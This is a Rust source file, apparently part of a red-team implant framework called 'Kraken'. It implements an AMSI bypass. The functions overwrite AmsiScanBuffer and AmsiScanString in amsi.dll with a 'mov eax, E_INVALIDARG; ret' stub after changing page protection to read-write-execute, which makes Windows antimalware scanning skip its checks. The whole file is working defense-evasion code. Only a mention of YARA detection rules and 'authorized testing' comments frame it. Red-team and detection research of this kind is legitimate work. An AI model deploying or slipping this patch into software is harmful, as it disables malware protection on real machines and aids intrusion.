//! AMSI (Antimalware Scan Interface) bypass — Phase 4 OPSEC
//!
//! Patches AmsiScanBuffer to bypass script scanning.
//! Detection rules: wiki/detection/yara/kraken_opsec.yar

use common::KrakenError;

#[cfg(target_os = "windows")]
use core::ffi::c_void;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

/// AMSI patch status
#[derive(Debug, Clone, Copy, Default)]
pub struct AmsiStatus {
    pub amsi_scan_buffer_patched: bool,
    pub amsi_scan_string_patched: bool,
}

/// Patch AmsiScanBuffer to return E_INVALIDARG
///
/// This patches the function in amsi.dll to return E_INVALIDARG (0x80070057),
/// which causes the caller to skip the scan.
///
/// Patch bytes:
/// ```asm
/// mov eax, 0x80070057  ; B8 57 00 07 80 - return E_INVALIDARG
/// ret                   ; C3             - return immediately
/// ```
///
/// # Safety
/// This modifies code in amsi.dll. Only call in authorized testing scenarios.
#[cfg(target_os = "windows")]
pub unsafe fn patch_amsi_scan_buffer() -> Result<(), KrakenError> {
    // Load amsi.dll (it may not be loaded yet)
    let amsi = LoadLibraryA(b"amsi.dll\0".as_ptr());
    if amsi == 0 {
        return Err(KrakenError::Module("amsi.dll not found/loaded".into()));
    }

    // Get AmsiScanBuffer address
    let amsi_scan = GetProcAddress(amsi, b"AmsiScanBuffer\0".as_ptr());
    if amsi_scan.is_none() {
        return Err(KrakenError::Module("AmsiScanBuffer not found".into()));
    }
    let amsi_scan = amsi_scan.unwrap() as *mut u8;

    // Patch bytes: mov eax, E_INVALIDARG; ret
    // E_INVALIDARG = 0x80070057
    let patch: [u8; 6] = [
        0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
        0xC3, // ret
    ];

    // Change memory protection
    let mut old_protect: u32 = 0;
    let result = VirtualProtect(
        amsi_scan as *const c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );

    if result == 0 {
        return Err(KrakenError::Module("VirtualProtect failed".into()));
    }

    // Write patch
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan, patch.len());

    // Restore original protection
    VirtualProtect(
        amsi_scan as *const c_void,
        patch.len(),
        old_protect,
        &mut old_protect,
    );

    tracing::info!("AMSI: AmsiScanBuffer patched successfully");
    Ok(())
}

/// Patch AmsiScanString to return E_INVALIDARG
///
/// Similar to AmsiScanBuffer but for string scanning.
///
/// # Safety
/// This modifies code in amsi.dll. Only call in authorized testing scenarios.
#[cfg(target_os = "windows")]
pub unsafe fn patch_amsi_scan_string() -> Result<(), KrakenError> {
    // Load amsi.dll
    let amsi = LoadLibraryA(b"amsi.dll\0".as_ptr());
    if amsi == 0 {
        return Err(KrakenError::Module("amsi.dll not found/loaded".into()));
    }

    // Get AmsiScanString address
    let amsi_scan = GetProcAddress(amsi, b"AmsiScanString\0".as_ptr());
    if amsi_scan.is_none() {
        return Err(KrakenError::Module("AmsiScanString not found".into()));
    }
    let amsi_scan = amsi_scan.unwrap() as *mut u8;

    // Same patch as AmsiScanBuffer
    let patch: [u8; 6] = [
        0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
        0xC3, // ret
    ];

    // Change memory protection
    let mut old_protect: u32 = 0;
    let result = VirtualProtect(
        amsi_scan as *const c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );

    if result == 0 {
        return Err(KrakenError::Module("VirtualProtect failed".into()));
    }

    // Write patch
    core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan, patch.len());

    // Restore original protection
    VirtualProtect(
        amsi_scan as *const c_void,
        patch.len(),
        old_protect,
        &mut old_protect,
    );

    tracing::info!("AMSI: AmsiScanString patched successfully");
    Ok(())
}

/// Patch all AMSI functions
///
/// # Safety
/// This modifies code in amsi.dll. Only call in authorized testing scenarios.
#[cfg(target_os = "windows")]
pub unsafe fn patch_all_amsi() -> Result<AmsiStatus, KrakenError> {
    let mut status = AmsiStatus::default();

    // Patch AmsiScanBuffer
    match patch_amsi_scan_buffer() {
        Ok(()) => status.amsi_scan_buffer_patched = true,
        Err(e) => tracing::warn!("Failed to patch AmsiScanBuffer: {}", e),
    }

    // Patch AmsiScanString
    match patch_amsi_scan_string() {
        Ok(()) => status.amsi_scan_string_patched = true,
        Err(e) => tracing::warn!("Failed to patch AmsiScanString: {}", e),
    }

    // Return error if neither succeeded
    if !status.amsi_scan_buffer_patched && !status.amsi_scan_string_patched {
        return Err(KrakenError::Module("All AMSI patches failed".into()));
    }

    Ok(status)
}

// =============================================================================
// Non-Windows stubs
// =============================================================================

#[cfg(not(target_os = "windows"))]
pub fn patch_amsi_scan_buffer() -> Result<(), KrakenError> {
    Err(KrakenError::Module(
        "AMSI patching only supported on Windows".into(),
    ))
}

#[cfg(not(target_os = "windows"))]
pub fn patch_amsi_scan_string() -> Result<(), KrakenError> {
    Err(KrakenError::Module(
        "AMSI patching only supported on Windows".into(),
    ))
}

#[cfg(not(target_os = "windows"))]
pub fn patch_all_amsi() -> Result<AmsiStatus, KrakenError> {
    Err(KrakenError::Module(
        "AMSI patching only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_amsi_status_default() {
        let status = AmsiStatus::default();
        assert!(!status.amsi_scan_buffer_patched);
        assert!(!status.amsi_scan_string_patched);
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_patch_amsi_scan_buffer_non_windows() {
        let result = patch_amsi_scan_buffer();
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_patch_amsi_scan_string_non_windows() {
        let result = patch_amsi_scan_string();
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_patch_all_amsi_non_windows() {
        let result = patch_all_amsi();
        assert!(result.is_err());
    }
}
